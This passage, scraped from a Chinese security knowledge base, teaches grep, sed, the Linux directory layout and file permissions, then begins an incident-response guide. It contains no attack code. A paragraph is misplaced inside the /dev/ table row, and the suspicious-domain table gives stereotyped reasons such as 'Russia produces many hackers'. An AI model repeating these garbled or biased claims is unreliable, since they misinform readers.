命令的由来可以追溯到 UNIX 诞生的早期，在 UNIX 系统中，搜索的模式（patterns）被称为正则表达式（regular expressions），为了要彻底搜索一个文件，有的用户在要搜索的字符串前加上前缀 global（全面的），一旦找到相匹配的内容，用户就像将其输出（print）到屏幕上，而将这一系列的操作整合到一起就是 global regular expressions print，而这也就是 grep 命令的全称。 grep命令能够在一个或多个文件中，搜索某一特定的字符模式（也就是正则表达式），此模式可以是单一的字符、字符串、单词或句子。 正则表达式是描述一组字符串的一个模式，正则表达式的构成模仿了数学表达式，通过使用操作符将较小的表达式组合成一个新的表达式。正则表达式可以是一些纯文本文字，也可以是用来产生模式的一些特殊字符。为了进一步定义一个搜索模式，grep 命令支持如表 1 所示的这几种正则表达式的元字符（也就是通配符） 通配符 功能 c* 将匹配 0 个（即空白）或多个字符 c（c 为任一字符）。 . 将匹配任何一个字符，且只能是一个字符。 [xyz] 匹配方括号中的任意一个字符。 xyz 匹配除方括号中字符外的所有字符。 ^ 锁定行的开头。 $ 锁定行的结尾。 需要注意的是，在基本正则表达式中，如通配符 、+、{、|、( 和 )等，已经失去了它们原本的含义，而若要恢复它们原本的含义，则要在之前添加反斜杠 \\，如 \\、+、{、|、( 和 )。 grep 命令是用来在每一个文件或中（或特定输出上）搜索特定的模式，当使用 grep 时，包含指定字符模式的每一行内容，都会被打印（显示）到屏幕上，但是使用 grep 命令并不改变文件中的内容。 grep 命令的基本格式如下： [root@localhost ~]# grep [选项] 模式 文件名 这里的模式，要么是字符（串），要么是正则表达式。而此命令常用的选项以及各自的含义如表 2 所示。 选项 含义 -c 仅列出文件中包含模式的行数。 -i 忽略模式中的字母大小写。 -l 列出带有匹配行的文件名。 -n 在每一行的最前面列出行号。 -v 列出没有匹配模式的行。 -w 把表达式当做一个完整的单字符来搜寻，忽略那些部分匹配的行。 注意，如果是搜索多个文件，grep 命令的搜索结果只显示文件中发现匹配模式的文件名；而如果搜索单个文件，grep 命令的结果将显示每一个包含匹配模式的行。 【例 1】假设有一份 emp.data 员工清单，现在要搜索此文件，找出职位为 CLERK 的所有员工，则执行命令如下： [root@localhost ~]# grep CLERK emp.data \\#忽略输出内容 而在此基础上，如果只想知道职位为 CLERK 的员工的人数，可以使用“-c”选项，执行命令如下： [root@localhost ~]# grep -c CLERK emp.data #忽略输出内容 【例 2】搜索 emp.data 文件，使用正则表达式找出以 78 开头的数据行，执行命令如下： [root@localhost ~]# grep ^78 emp.data #忽略输出内容 Linux sed命令完全攻略（超级详细） 我们知道，Vim 采用的是交互式文本编辑模式，你可以用键盘命令来交互性地插入、删除或替换数据中的文本。但本节要讲的 sed 命令不同，它采用的是流编辑模式，最明显的特点是，在 sed 处理数据之前，需要预先提供一组规则，sed 会按照此规则来编辑数据。 sed 会根据脚本命令来处理文本文件中的数据，这些命令要么从命令行中输入，要么存储在一个文本文件中，此命令执行数据的顺序如下： 每次仅读取一行内容； 根据提供的规则命令匹配并修改数据。注意，sed 默认不会直接修改源文件数据，而是会将数据复制到缓冲区中，修改也仅限于缓冲区中的数据； 将执行结果输出。 当一行数据匹配完成后，它会继续读取下一行数据，并重复这个过程，直到将文件中所有数据处理完毕。 sed 命令的基本格式如下： [root@localhost ~]# sed [选项] [脚本命令] 文件名 选项 含义 -e 脚本命令 该选项会将其后跟的脚本命令添加到已有的命令中。 -f 脚本命令文件 该选项会将其后文件中的脚本命令添加到已有的命令中。 -n 默认情况下，sed 会在所有的脚本指定执行完毕后，会自动输出处理后的内容，而该选项会屏蔽启动输出，需使用 print 命令来完成输出。 -i 此选项会直接修改源文件，要慎用。 成功使用 sed 命令的关键在于掌握各式各样的脚本命令及格式，它能帮你定制编辑文件的规则。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 21:52:03 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/18.Linux常用命令.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/19.文件系统与文件权限.html":{"url":"知识库/03.主机安全/19.文件系统与文件权限.html","title":"19.文件系统与文件权限","keywords":"","body":" 文件系统与文件权限 文件系统 文件权限 文件系统与文件权限 文件系统 在linux操作系统中，所有的文件和目录都被组织成一个以/结点开始的倒置树状结构，如下图所示 其中，目录就相当于 Windows 中的文件夹，目录中存放的既可以是文件，也可以是其他的子目录，而文件中存储的是真正的信息。 文件系统的最顶层是由根目录开始的，系统使用“/”来表示根目录，在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含（子）目录或文件。如此反复就可以构成一个庞大的文件系统。 其实，使用这种树状、具有层次的文件结构主要目的是方便文件系统的管理和维护，想象一下，如果所有的文件都放在一个目录下，其文件系统的管理和维护将变成一场噩梦。 在文件系统中，有两个特殊的目录，一个是用户所在的工作目录，即当前目录，可用一个点“.”表示；另一个是当前目录的上一层目录，也叫父目录，用两个点“..”表示 如果一个目录或文件名是以一个点开始，就表示这个目录或文件是一个隐藏目录或文件。即以默认方式査找，不显示该目录或文件。 为了方便管理和维护，Linux 系统采用了文件系统层次标准，也称为 FHS 标准，它规定了根目录下各个目录应该存在哪些类型的文件（或子目录），比如说，在 /bin 和 /sbin 目录中存放的应该是可执行文件。 一级目录 功能（作用） /bin 存放系统命令，普通用户和 root 都可以执行。放在 /bin 下的命令在单用户模式下也可以执行 /boot/ 系统启动目录，保存与系统启动相关的文件，如内核文件和启动引导程序（grub）文件等 /dev/ 设备文件保存位置根据以上各表列举的各目录及作用，如果我们要做一些实验和练习，需要创建一些临时文件，应该保存在哪里呢？答案是用户的主目录或 /tmp/ 临时目录。但是要小心有些目录中不能直接修改和保存数据，比如 /proc/fn/sys/ 目录，因为它们是保存在内存中的，如果在这里写入数据，那么你的内存会越来越小，直至死机；/boot/ 目录也不能保存额外数据，因为 /boot/ 目录会单独分区作为启动分区，如果没有空闲空间，则会导致系统不能正常启动。总之，Linux 要在合理的目录下进行操作和修改。 /etc/ 配置文件保存位置。系统内所有采用默认安装方式（rpm 安装）的服务配置文件全部保存在此目录中，如用户信息、服务的启动脚本、常用服务的配置文件等 /home/ 普通用户的主目录（也称为家目录）。在创建用户时，每个用户要有一个默认登录和保存自己数据的位置，就是用户的主目录，所有普通用户的主目录是在 /home/ 下建立一个和用户名相同的目录。如用户 aaron 的主目录就是 /home/aaron /lib/ 系统调用的函数库保存位置 /media/ 挂载目录。系统建议用来挂载媒体设备，如软盘和光盘 /mnt/ 挂载目录。早期 Linux 中只有这一个挂载目录，并没有细分。系统建议这个目录用来挂载额外的设备，如 U 盘、移动硬盘和其他操作系统的分区 /misc/ 挂载目录。系统建议用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录 /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由管理员自己决定。例如，笔者在接触 Linux 的时候，默认挂载目录只有 /mnt/，所以养成了在 /mnt/ 下建立不同目录挂载不同设备的习惯，如 /mnt/cdrom/ 挂载光盘、/mnt/usb/ 挂载 U 盘，都是可以的 /opt/ 第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。不过笔者还是习惯把软件放到 /usr/local/ 目录中，也就是说，/usr/local/ 目录也可以用来安装软件 /root/ root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在“/”下 /sbin/ 保存与系统环境设置相关的命令，只有 root 可以使用这些命令进行系统环境设置，但也有些命令可以允许普通用户查看 /srv/ 服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 /tmp/ 临时目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清空 FHS 针对根目录中包含的子目录仅限于表 1，但除此之外，Linux 系统根目录下通常还包含表 2 中的几个一级目录。 一级目录 功能（作用） /lost+found/ 当系统意外崩溃或意外关机时，产生的一些文件碎片会存放在这里。在系统启动的过程中，fsck 工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如，/lost+found 就是根分区的备份恢复目录，/boot/lost+found 就是 /boot 分区的备份恢复目录 /proc/ 虚拟文件系统。该目录中的数据并不保存在硬盘上，而是保存到内存中。主要保存系统的内核、进程、外部设备状态和网络状态等。如 /proc/cpuinfo 是保存 CPU 信息的，/proc/devices 是保存设备驱动的列表的，/proc/filesystems 是保存文件系统列表的，/proc/net 是保存网络协议信息的...... /sys/ 虚拟文件系统。和 /proc/ 目录相似，该目录中的数据都保存在内存中，主要保存与内核相关的信息 Linux /usr目录 usr（注意不是 user），全称为 Unix Software Resource，此目录用于存储系统软件资源。FHS 建议所有开发者，应把软件产品的数据合理的放置在 /usr 目录下的各子目录中，而不是为他们的产品创建单独的目录。 Linux 系统中，所有系统默认的软件都存储在 /usr 目录下，/usr 目录类似 Windows 系统中 C:\\Windows\\ + C:\\Program files\\ 两个目录的综合体。 FHS 建议，/usr 目录应具备表 3 所示的子目录。 子目录 功能（作用） /usr/bin/ 存放系统命令，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行 /usr/sbin/ 存放根文件系统不必要的系统管理命令，如多数服务程序，只有 root 可以使用。 /usr/lib/ 应用程序调用的函数库保存位置 /usr/XllR6/ 图形界面系统保存位置 /usr/local/ 手工安装的软件保存位置。我们一般建议源码包软件安装在这个位置 /usr/share/ 应用程序的资源文件保存位置，如帮助文档、说明文档和字体目录 /usr/src/ 源码包保存位置。我们手工下载的源码包和内核源码包都可以保存到这里。不过笔者更习惯把手工下载的源码包保存到 /usr/local/src/ 目录中，把内核源码保存到 /usr/src/linux/ 目录中 /usr/include C/C++等编程语言头文件的放置目录 Linux /var 目录 /var 目录用于存储动态数据，例如缓存、日志文件、软件运行过程中产生的文件等。通常，此目录下建议包含如表 4 所示的这些子目录。 var子目录 功能（作用） /var/lib/ 程序运行中需要调用或改变的数据保存位置。如 MySQL 的数据库保存在 /var/lib/mysql/ 目录中 /var/log/ 登陆文件放置的目录，其中所包含比较重要的文件如 /var/log/messages, /var/log/wtmp 等。 /var/run/ 一些服务和程序运行后，它们的 PID（进程 ID）保存位置 /var/spool/ 里面主要都是一些临时存放，随时会被用户所调用的数据，例如 /var/spool/mail/ 存放新收到的邮件，/var/spool/cron/ 存放系统定时任务。 /var/www/ RPM 包安装的 Apache 的网页主目录 /var/nis和/var/yp NIS 服务机制所使用的目录，nis 主要记录所有网络中每一个 client 的连接信息；yp 是 linux 的 nis 服务的日志文件存放的目录 /var/tmp 一些应用程序在安装或执行时，需要在重启后使用的某些文件，此目录能将该类文件暂时存放起来，完成后再行删除 根据以上各表列举的各目录及作用，如果我们要做一些实验和练习，需要创建一些临时文件，应该保存在哪里呢？ 答案是用户的主目录或 /tmp/ 临时目录。但是要小心有些目录中不能直接修改和保存数据，比如 /proc/fn/sys/ 目录，因为它们是保存在内存中的，如果在这里写入数据，那么你的内存会越来越小，直至死机；/boot/ 目录也不能保存额外数据，因为 /boot/ 目录会单独分区作为启动分区，如果没有空闲空间，则会导致系统不能正常启动。 总之，Linux 要在合理的目录下进行操作和修改。 文件权限 Linux 是多用户多任务操作系统，换句话说，Linux 系统支持多个用户在同一时间内登陆，不同用户可以执行不同的任务，并且互不影响。 例如，某台 Linux 服务器上有 4 个用户，分别是 root、www、ftp 和 mysql，在同一时间内，root 用户可能在查看系统日志、管理维护系统；www 用户可能在修改自己的网页程序；ftp 用户可能在上传软件到服务器；mysql 用户可能在执行自己的 SQL 查询，每个用户互不干扰，有条不紊地进行着自己的工作。与此同时，每个用户之间不能越权访问，比如 www 用户不能执行 mysql 用户的 SQL 查询操作，ftp 用户也不能修改 www 用户的网页程序。 不同用户具有不问的权限，毎个用户在权限允许的范围内完成不间的任务，Linux 正是通过这种权限的划分与管理，实现了多用户多任务的运行机制。 因此，如果要使用 Linux 系统的资源，就必须向系统管理员申请一个账户，然后通过这个账户进入系统（账户和用户是一个概念）。通过建立不同属性的用户，一方面可以合理地利用和控制系统资源，另一方面也可以帮助用户组织文件，提供对用户文件的安全性保护。 每个用户都有唯一的用户名和密码。在登录系统时，只有正确输入用户名和密码，才能进入系统和自己的主目录。 用户组是具有相同特征用户的逻辑集合。简单的理解，有时我们需要让多个用户具有相同的权限，比如查看、修改某一个文件的权限，一种方法是分别对多个用户进行文件访问授权，如果有 10 个用户的话，就需要授权 10 次，那如果有 100、1000 甚至更多的用户呢？ 显然，这种方法不太合理。最好的方式是建立一个组，让这个组具有查看、修改此文件的权限，然后将所有需要访问此文件的用户放入这个组中。那么，所有用户就具有了和组一样的权限，这就是用户组。 将用户分组是 Linux 系统中对用户进行管理及控制访问权限的一种手段，通过定义用户组，很多程序上简化了对用户的管理工作。 用户和用户组的对应关系有以下 4 种： 一对一：一个用户可以存在一个组中，是组中的唯一成员； 一对多：一个用户可以存在多个用户组中，此用户具有这多个组的共同权限； 多对一：多个用户可以存在一个组中，这些用户具有和组相同的权限； 多对多：多个用户可以存在多个组中，也就是以上 3 种关系的扩展。 用户和组之间的关系可以下图来表示： 和 Windows 系统不同，Linux 系统为每个文件都添加了很多的属性，最大的作用就是维护数据的安全。举个简单的例子，在你的 Linux 系统中，和系统服务相关的文件通常只有 root 用户才能读或写，就拿 /etc/shadow 这个文件来说，此文件记录了系统中所有用户的密码数据，非常重要，因此绝不能让任何人读取（否则密码数据会被窃取），只有 root 才可以有读取权限。 此外，如果你有一个软件开发团队，你希望团队中的每个人都可以使用某一些目录下的文件，而非团队的其他人则不予以开放。通过前面章节的学习我们知道，只需要将团队中的所有人加入新的群组，并赋予此群组读写目录的权限，即可实现要求。反之，如果你的目录权限没有做好，就很难防止其他人在你的系统中乱搞。 比如说，本来 root 用户才能做的开关机、ADSL 拨接程序，新增或删除用户等命令，一旦允许任何人拥有这些权限，系统很可能会经常莫名其妙的挂掉。而且，万一 root 用户的密码被其他人获取，他们就可以登录你的系统，从事一些只有 root 用户才能执行的操作，这是绝对不允许发生的。 因此，在服务器上，绝对不是所有的用户都使用 root 身份登录，而要根据不同的工作需要和职位需要，合理分配用户等级和权限等级。 Linux 系统中，文件或目录的权限信息，可以使用 ls 命令查看，例如： [root@localhost ~]# ls -al total 156 drwxr-x---. 4 root root 4096 Sep 8 14:06 . drwxr-xr-x. 23 root root 4096 Sep 8 14:21 .. -rw-------. 1 root root 1474 Sep 4 18:27 anaconda-ks.cfg -rw-------. 1 root root 199 Sep 8 17:14 .bash_history -rw-r--r--. 1 root root 24 Jan 6 2007 .bash_logout chgrp命令用于修改文件（或目录）的所属组。 chgrp 理解为是 \"change group\" 的缩写。 chgrp 命令的用法很简单，其基本格式为： [root@localhost ~]# chgrp [-R] 所属组 文件名（目录名） -R（注意是大写）选项长作用于更改目录的所属组，表示更改连同子目录中所有文件的所属组信息。 使用此命令需要注意的一点是，要被改变的群组名必须是真实存在的，否则命令无法正确执行，会提示 \"invaild group name\"。 举个例子，当以 root 身份登录 Linux 系统时，主目录中会存在一个名为 install.log 的文件，我们可以使用如下方法修改此文件的所属组： [root@localhost ~]# groupadd group1 #新建用于测试的群组 group1 [root@localhost ~]# chgrp group1 install.log #修改install.log文件的所属组为group1 [root@localhost ~]# ll install.log -rw-r--r--. 1 root group1 78495 Nov 17 05:54 install.log #修改生效 [root@localhost ~]# chgrp testgroup install.log chgrp: invaild group name 'testgroup' 可以看到，在具有 group1 群组的前提下，我们成功修改了 install.log 文件的所属组，但我们再次试图将所属组修改为 testgroup 时，命令执行失败，就是因为系统的 /etc/group 文件中，没有 testgroup 群组。 chown 命令，可以认为是 \"change owner\" 的缩写，主要用于修改文件（或目录）的所有者，除此之外，这个命令也可以修改文件（或目录）的所属组。 当只需要修改所有者时，可使用如下 chown 命令的基本格式： [root@localhost ~]# chown [-R] 所有者 文件或目录 -R（注意大写）选项表示连同子目录中的所有文件，都更改所有者。 如果需要同时更改所有者和所属组，chown 命令的基本格式为： [root@localhost ~]# chown [-R] 所有者:所属组 文件或目录 注意，在 chown 命令中，所有者和所属组中间也可以使用点（.），但会产生一个问题，如果用户在设定账号时加入了小数点（例如 zhangsan.temp），就会造成系统误判。因此，建议大家使用冒号连接所有者和所属组。 当然，chown 命令也支持单纯的修改文件或目录的所属组，例如 chown :group install.log 就表示修改 install.log 文件的所属组，但修改所属组通常使用 chgrp 命令，因此并不推荐大家使用 chown 命令。 另外需要注意的一点是，使用 chown 命令修改文件或目录的所有者（或所属者）时，要保证使用者用户（或用户组）存在，否则该命令无法正确执行，会提示 \"invalid user\" 或者 \"invaild group\"。 其实，修改文件的所有者，更多时候是为了得到更高的权限，举一个实例： [root@localhost ~]# touch file #由root用户创建file文件 [root@localhost ~]# ll file -rw-r--r--. 1 root root 0 Apr 17 05:12 file #文件的所有者是root，普通用户user对这个文件拥有只读权限 [root@localhost ~]# chown user file #修改文件的所有者 [root@localhost ~]# ll file -rw-r--r--. 1 user root 0 Apr 17 05:12 file #所有者变成了user用户，这时user用户对这个文件就拥有了读、写权限 可以看到，通过修改 file 文件的所有者，user 用户从其他人身份（只对此文件有读取权限）转变成了所有者身份，对此文件拥有读和写权限。 Linux 系统中，用户等级权限的划分是非常清楚的，root 用户拥有最高权限，可以修改任何文件的权限，而普通用户只能修改自己文件的权限（所有者是自己的文件），例如： [root@localhost ~]# cd /home/user #进入user用户的家目录 [root@localhost user]# touch test #由root用户新建文件test [root@localhost user]# ll test -rw-r--r--. 1 root root 0 Apr 17 05:37 test #文件所有者和所属组都是root用户 [root@localhost user]# su - user #切换为user用户 [user@localhost ~]$ chmod 755 test chmod:更改\"test\"的权限：不允许的操作 #user用户不能修改test文件的权限 [user@localhost ~]$ exit #退回到root身份 [root@localhost user]# chown user test #由root用户把test文件的所有者改为user用户 [root@localhost user]# su - user #切换为user用户 [user@localhost ~]$ chmod 755 test #user用户由于是test文件的所有者，所以可以修改文件的权限 [user@localhost ~]$ ll test -rwxr-xr-x. 1 user root 0 Apr 17 05:37 test #查看权限 可以看到，user 用户无权更改所有者为 root 用户文件的权限，只有普通用户是这个文件的所有者，才可以修改文件的权限。 [root@localhost ~]# chown user:group file [root@localhost ~]# ll file -rw-r--r--. 1 user group 0 Apr 17 05:12 file Linux 系统，最常见的文件权限有 3 种，即对文件的读（用 r 表示）、写（用 w 表示）和执行（用 x 表示，针对可执行文件或目录）权限。在 Linux 系统中，每个文件都明确规定了不同身份用户的访问权限，通过 ls 命令即可看到。 除此之外，我们有时会看到 s（针对可执行文件或目录，使文件在执行阶段，临时拥有文件所有者的权限）和 t（针对目录，任何用户都可以在此目录中创建文件，但只能删除自己的文件），文件设置 s 和 t 权限，会占用 x 权限的位置。 root@localhost ~]# ls -al total 156 drwxr-x---. 4 root root 4096 Sep 8 14:06 . drwxr-xr-x. 23 root root 4096 Sep 8 14:21 .. -rw-------. 1 root root 1474 Sep 4 18:27 anaconda-ks.cfg -rw-------. 1 root root 199 Sep 8 17:14 .bash_history -rw-r--r--. 1 root root 24 Jan 6 2007 .bash_logout ... 可以看到，每行的第一列表示的就是各文件针对不同用户设定的权限，一共 11 位，但第 1 位用于表示文件的具体类型，最后一位此文件受 SELinux 的安全规则管理 因此，为文件设定不同用户的读、写和执行权限，仅涉及到 9 位字符，以 ls 命令输出信息中的 .bash_logout 文件为例，设定不同用户的访问权限是 rw-r--r--，各权限位的含义如下图所示。 从图中可以看到，Linux 将访问文件的用户分为 3 类，分别是文件的所有者，所属组（也就是文件所属的群组）以及其他人。 有关群组的概念，我们已在用户和用户组一章中做了说明。除了所有者，以及所属群组中的用户可以访问文件外，其他用户（其他群组中的用户）也可以访问文件，这部分用户都归为其他人范畴。 很显然，Linux 系统为 3 种不同的用户身份，分别规定了是否对文件有读、写和执行权限。拿图 1 来说，文件所有者拥有对文件的读和写权限，但是没有执行权限；所属群组中的用户只拥有读权限，也就是说，这部分用户只能读取文件内容，无法修改文件；其他人也是只能读取文件。 Linux 系统中，多数文件的文件所有者和所属群组都是 root（都是 root 账户创建的），这也就是为什么，root 用户是超级管理员，权限足够大的原因。 rwx 权限对文件的作用 rwx权限 对文件的作用 读权限（r） 表示可读取此文件中的实际内容，例如，可以对文件执行 cat、more、less、head、tail 等文件查看命令。 写权限（w） 表示可以编辑、新增或者修改文件中的内容，例如，可以对文件执行 vim、echo 等修改文件数据的命令。注意，无权限不赋予用户删除文件的权利，除非用户对文件的上级目录拥有写权限才可以。 执行权限（x） 表示该文件具有被系统执行的权限。Window系统中查看一个文件是否为可执行文件，是通过扩展名（.exe、.bat 等），但在 Linux 系统中，文件是否能被执行，是通过看此文件是否具有 x 权限来决定的。也就是说，只要文件拥有 x 权限，则此文件就是可执行文件。但是，文件到底能够正确运行，还要看文件中的代码是否正确。 对于文件来说，执行权限是最高权限。给用户或群组设定权限时，是否赋予执行权限需要慎重考虑，否则会对系统安装造成严重影响。 rwx 权限对目录的作用 目录，主要用来记录文件名列表，不同的权限对目录的作用如表 2 所示。 rwx权限 对目录的作用 读权限（r） 表示具有读取目录结构列表的权限，也就是说，可以看到目录中有哪些文件和子目录。一旦对目录拥有 r 权限，就可以在此目录下执行 ls 命令，查看目录中的内容。 写权限（w） 对于目录来说，w 权限是最高权限。对目录拥有 w 权限，表示可以对目录做以下操作：1. 在此目录中建立新的文件或子目录；2. 删除已存在的文件和目录（无论子文件或子目录的权限是怎样的）；3.对已存在的文件或目录做更名操作；移动此目录下的文件和目录的位置。一旦对目录拥有 w 权限，就可以在目录下执行 touch、rm、cp、mv 等命令。 执行权限（x） 目录是不能直接运行的，对目录赋予 x 权限，代表用户可以进入目录，也就是说，赋予 x 权限的用户或群组可以使用 cd 命令。 对目录来说，如果只赋予 r 权限，则此目录是无法使用的。很简单，只有 r 权限的目录，用户只能查看目录结构，根本无法进入目录（需要用 x 权限），更不用说使用了。因此，对于目录来说，常用来设定目录的权限其实只有 0（---）、5（r-x）、7（rwx）这 3 种。 chmod命令使用数字修改文件权限 Linux 系统中，文件的基本权限由 9 个字符组成，以 rwxrw-r-x 为例，我们可以使用数字来代表各个权限，各个权限与数字的对应关系如下： r --> 4 w --> 2 x --> 1 由于这 9 个字符分属 3 类用户，因此每种用户身份包含 3 个权限（r、w、x），通过将 3 个权限对应的数字累加，最终得到的值即可作为每种用户所具有的权限。 拿 rwxrw-r-x 来说，所有者、所属组和其他人分别对应的权限值为： 所有者 = rwx = 4+2+1 = 7 所属组 = rw- = 4+2 = 6 其他人 = r-x = 4+1 = 5 所以，此权限对应的权限值就是 765。 使用数字修改文件权限的 chmod 命令基本格式为： [root@localhost ~]# chmod [-R] 权限值 文件名 -R（注意是大写）选项表示连同子目录中的所有文件，也都修改设定的权限。 例如，使用如下命令，即可完成对 .bashrc 目录文件的权限修改： [root@localhost ~]# ls -al .bashrc -rw-r--r--. 1 root root 176 Sep 22 2004 .bashrc [root@localhost ~]# chmod 777 .bashrc [root@localhost ~]# ls -al .bashrc -rwxrwxrwx. 1 root root 176 Sep 22 2004 .bashrc 再举个例子，通常我们以 Vim 编辑 Shell 文件批处理文件后，文件权限通常是 rw-rw-r--（644），那么，如果要将该文件变成可执行文件，并且不让其他人修改此文件，则只需将此文件的权限该为 rwxr-xr-x（755）即可。 chmod命令使用字母修改文件权限 既然文件的基本权限就是 3 种用户身份（所有者、所属组和其他人）搭配 3 种权限（rwx），chmod 命令中用 u、g、o 分别代表 3 种身份，还用 a 表示全部的身份（all 的缩写）。另外，chmod 命令仍使用 r、w、x 分别表示读、写、执行权限。 使用字母修改文件权限的 chmod 命令，其基本格式如图 1 所示。 例如，如果我们要设定 .bashrc 文件的权限为 rwxr-xr-x，则可执行如下命令： [root@localhost ~]# chmod u=rwx,go=rx .bashrc [root@localhost ~]# ls -al .bashrc -rwxr-xr-x. 1 root root 176 Sep 22 2004 .bashrc 再举个例子，如果想要增加 .bashrc 文件的每种用户都可做写操作的权限，可以使用如下命令： [root@localhost ~]# ls -al .bashrc -rwxr-xr-x. 1 root root 176 Sep 22 2004 .bashrc [root@localhost ~]# chmod a+w .bashrc [root@localhost ~]# ls -al .bashrc -rwxrwxrwx. 1 root root 176 Sep 22 2004 .bashrc Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 21:52:44 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/19.文件系统与文件权限.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/20.应急响应.html":{"url":"知识库/03.主机安全/20.应急响应.html","title":"20.应急响应","keywords":"","body":" 前言 过程驱动 OODA 模型 情报获取 情报分析 情报决策 情报处置 应急响应 生命周期 应急响应预案 应急步骤 初步信息搜集 整体流程 可疑信息 Web 应急响应 webshell Linux 文件 进程&&网络 日志 Windows 文件 进程 && 网络 日志 前言 随着网络安全变得更加复杂，边界变得更加模糊，在建设企业安全时，需要考虑到要建设规范的应急响应流程，而不是着急忙慌地去点对点地解决问题，这样费力不讨好，而且很容易造成做一次，忘一次；那么在企业安全建设中，“ 规范应急响应流程，提升应急响应能力” 就是应急响应的目标。 过程驱动 应急响应是什么时候做？难道是要等到安全事故发生之后才做吗？首先需要明确，如果没有安全事件的发生，我们需要做吗？答案是肯定的，应急响应本身就是防患于未然，当发生安全事件之后，能够及时 发现 ，定位 ，解决，恢复，总结，能在最小损失下完成自救过程。 说到应急响应，首先会想到威胁情报，也可以说情报驱动应急响应。那么什么是威胁情报呢？旨在面临威胁的资产主体提供全面的、准确的、与其相关的、并且能够执行和决策的知识和信息。 那么怎么开展威胁情报工作呢？可以从OODA模型、情报获取、情报分析、情报决策、情报处置这五个方面说起。 OODA 模型 OODA 模型，又叫博伊德环，它是由Observation(观察)、Orientation(判断)、Decision(决策)、Action(执行)，四个步骤组成，将行动前的动作，进行一步一步分解，这些步骤，可以让我们的行动，有据可依，通过这个循环，则可以让我们的行动更加系统化，理性化 情报获取 在做威胁情报收集时，大多数途径是来自于外部互联网漏洞预警，主要包括，Twitter、CNVD，CVE、Microsoft 热更新，Exchange，安全公众号，情报共享群，监管机构预警的漏洞情报 情报分析 收集完成情报之后，就需要进行初步筛选，去掉假情报。 一般攻击链较复杂的漏洞，除了直接远程代码执行，任意代码执行，反序列化等高危漏洞，都可根据漏洞利用的难易程度，受影响范围，以及是否公布POC 来进行评判优先级，这样可以尽快分析处理，毕竟每个企业的安全人员都是有限的。 情报决策 对筛选出的漏洞进行分析之后，需要根据评判出的优先顺序写出情报分析报告，其中报告需要包括情报来源，情报类型，复现情况，修复方案，受影响的资产（特别注意互联网暴露面资产），是否已有poc等，从而得出风险等级，发给领导决策，审阅，一般高危以上的情报，且也有受影响的资产，这时需要找领导沟通之后，尽快做出决策，启动应急响应，注意，无许可不能擅做主张。 情报处置 针对已筛选出的情报，且领导也审阅完成，这时就需要根据内部的规范流程，准备好应急响应的方案，受影响的资产，反馈表等，提交给研发团队，对漏洞进行处置，待漏洞处置完成之后还需要验证漏洞的修复情况，直至修复完成，这一步的反馈表，是为了防止有资产更新情况但未发现，需要研发反馈。 应急响应 生命周期 应急响应的操作步骤，主要为 准备：分析资产的风险、组建管理人员，团队、风险加固、保障资源储备、技术支持资源库 检测：日常运维监控、事件判断、事件上报 | 事件等级判定： | | | | | --- | --- | --- | --- | | 一般事件 | 较大事件 | 重大事件 | 特别重大事件 | | 事件类型： | | | | | 恶意程序事件 | 网络攻击事件 | Web攻击事件 | 业务安全事件 | | 计算机病毒事件 | 拒绝服务攻击事件 | Webshell | 数据泄露 | | 特洛伊木马事件 | 漏洞攻击事件 | 网页挂马 | 权限泄漏 | | 勒索事件 | 网络钓鱼事件 | 网页篡改 | 薅羊毛 | | 僵尸网络事件 | 后门攻击事件 | 网页暗链 | 流程绕过 | | 挖矿事件 | 网络窃听事件 | | | 遏制 控制事件蔓延 采取有效措施防止事件进一步扩大 尽可能减少负面影响 遏制效应 采取常规的技术手段处理应急响应事件 尝试快速修复系统，消除应急响应事件带来的影响 遏制监测 确认当前抑制手段是否有效 分析应急事件发生的原因，为消除阶段提供解决方案 消除 恢复 启动应急预案 协调安全人员 选取应急响应方案 消除威胁 根据应急方案进行恢复处置 恢复信息系统 持续监测 处置成功后续，对信息系统持续监测 确认应急事件已根除 信息系统恢复到正常情况之后的持续监控 反思 应急响应报告 由应急响应实施小组报告（撰写）应急响应事件的处置情况 应急事件调查 对应急事件发生的原因进行调查 评估应急事件对信息系统造成的损失 评估应急事件对单位、组织带来的影响 应急响应总结复盘 对存在的风险点进行加固以及整改 评价应急预案的执行情况和后续改进计划应急响应预案 应急响应预案包括的主要内容： 确定风险场景 行动计划 描述可能受到影响的业务 团队和人员的职责 描述使用的预防性策略 联络清单 描述应急响应的策略 所需资源配置 识别和排列关键应用系统 成功预案的特点 清楚、简洁 高级管理层支持/组织/承诺 不断改进和更新恢复策略 及时维护更新应急步骤 初步信息搜集 | 客户属性 | 名称/区域/领域 | | --- | --- | | 入侵范围 | 主机数/网段 | | 入侵现象 | cpu过高，勒索界面，异常网络链接，安全设备告警 | | 需求对接 | 溯源、协助修复... | 收集信息：操作系统版本，补丁，数据库版本，中间件/服务器，网络拓扑，受害范围，处置情况，提取日志（主机，安全设备，数据库等） 务必亲自求证，眼见为实耳听为虚 整体流程 可疑信息 可疑域名后缀 顶级域名 申请地区或机构 重点关注原因 .ru 俄罗斯 俄罗斯盛产黑客 .ws 东萨摩亚 不知名国家 易申请，难追踪注册者 .cc 科科斯群岛 不知名国家 易申请，难追踪注册者 .pw 帕劳 不知名国家 易申请，难追踪注册者 .bz 伯利兹 不知名国家 易申请，难追踪注册者 .su 苏联 前苏联虽然解体了 顶级域名还在使用，且多与黑产有关 .bw 伯兹瓦纳 不知名国家 易申请，难追踪注册者 .gw 几内亚比绍 不知名国家 易申请，难追踪注册者 .ms 蒙塞拉特岛 不知名国家 